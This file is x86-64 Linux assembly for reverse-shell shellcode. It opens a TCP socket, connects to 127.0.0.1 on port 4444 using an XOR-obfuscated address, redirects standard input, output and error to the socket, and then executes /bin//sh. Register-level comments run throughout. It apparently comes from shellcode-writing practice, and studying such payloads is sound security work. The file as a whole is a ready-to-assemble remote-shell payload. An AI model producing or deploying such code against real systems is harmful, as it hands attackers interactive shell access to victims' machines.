global _start

section .text
_start:


; rax -> 41 syscall
; rdi -> socket family (2)
; rsi -> type (1)
; rdx -> protocol (0)
;sys_socket
    ; clean registers
    xor rax,rax ; clean rax
    xor rdi, rdi ; clean rdi
    xor rsi, rsi ; clean rsi
    xor rdx, rdx; clean rdx
    ; put 0x29 in rax
    push 0x29
    pop rax ; put 0x29 in rax
    ; put 0x2 in rdi
    push 0x2
    pop rdi ; put 0x2 in rdi
    ; put 0x1 in rsi
    push 0x1
    pop rsi ; put 0x1 in rsi
    ; put 0x0 in rdx
    xor rdx, rdx ; put 0x0 in rdx
    
    syscall
    
    ; setup for next syscall
    xor rdi, rdi ; clean rdi
    mov rdi, rax ; 

; rax -> 42 syscall
; rdi -> fd (3)
; rsi -> sockaddr (1)
; rdx -> addrlen (0)
;sys_connect
    ; put 42 in rax
    push 0x2A
    pop rax 

    ; put 127.0.0.1 in r15d
    mov r15d, 0x1011116e
    xor r15d, 0x11111111 ; r15d --> 127.0.0.1

    ; mov r15d, port and 2 in rsp (addr type AF_INET)
    mov dword [rsp + 4], r15d
    mov word [rsp + 2], 0x5c11
    mov byte [rsp], 0x2
    ; mov rsp in rsi
    push rsp
    pop rsi

    ; put addr len in rdx
    push 0x10
    pop rdx ; addrlen -> 16

    ; syscall
    syscall

;rax -> 0x21
;rdi  -> 0x3 (socket)
;rsi -> 0x2, 0x1, 0x0
    ; put 33 in rax
	push 0x21		;dup2 syscall
	pop	rax 
    push 0x2
    pop rsi
    syscall

	push 0x21		;dup2 syscall
	pop	rax 
    push 0x1
    pop rsi
    syscall

	push 0x21		;dup2 syscall
	pop	rax 
    xor rsi, rsi
    syscall


;rax -> 59
;rdi -> /bin//sh0x00
;rsi -> null-byte 0x00
;rdx -> null-byte 0x00
spawn_shell:
    ; clean rsi
    xor rsi, rsi
    
    ; put 0x0 on stack
    push rsi
    
    ; clean rdx
    xor rdx, rdx
    

    
    ; put /bin//sh on rdi
    mov rdi,0x68732f2f6e69622f
    push rdi
    
    push rsp
    ; pointer on rsp 
    pop rdi

    ; clean rax
    xor rax, rax
    
    ; put 59 on rax
    mov al, 59
    
    syscall
